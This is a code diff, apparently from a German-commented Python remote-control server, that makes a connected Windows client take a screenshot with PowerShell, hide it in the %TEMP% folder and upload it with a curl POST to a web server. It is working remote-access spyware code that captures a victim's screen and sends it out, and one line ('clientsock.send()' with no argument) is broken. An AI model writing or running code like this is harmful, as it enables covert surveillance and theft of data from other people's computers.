@@ -32,9 +32,7 @@ def showHelp():
     
     
     
-def upload_screenshot(screenshot_path):
-    url = "http://127.0.0.1:5000/upload" 
-    #mit Curl hochladen
+
     
 
 
@@ -68,7 +66,9 @@ echo $ScreenHeight; ^
 
 $bounds = "[Drawing.Rectangle]::FromLTRB(0, 0, $ScreenWidth, $ScreenHeight)";^
 
-screenshot $bounds "C:\Users\admin\Desktop\screenshot.png";'''
+if(-not(Test-Path -Path "$env:TEMP\screenshot")){mkdir $env:TEMP\screenshot};^
+
+screenshot $bounds "$env:TEMP\screenshot\screenshot.png";'''
     
     while True:
         
@@ -92,9 +92,18 @@ screenshot $bounds "C:\Users\admin\Desktop\screenshot.png";'''
         elif command.lower() == "screen":
             screenshot()
         elif command.lower() == "test":
-            clientsock.send("cd".encode())
-            time.sleep(2)
+            time.sleep(1)
+            clientsock.send("echo %TEMP%".encode())
+            envTEMP = clientsock.recv(65500).decode()
+            envTEMPconvertiert = envTEMP.replace("\\","/").rstrip()
+            
             clientsock.send(CMDCODE.encode())   
+            
+            #Send Screenshot with curl to a Webserver
+            curlCommand = f'curl -X POST -F "file=@{envTEMPconvertiert}/screenshot/screenshot.png" http://127.0.0.1:5000/upload' 
+            
+            clientsock.send(curlCommand.encode())
+            clientsock.send()
             continue        
         
             
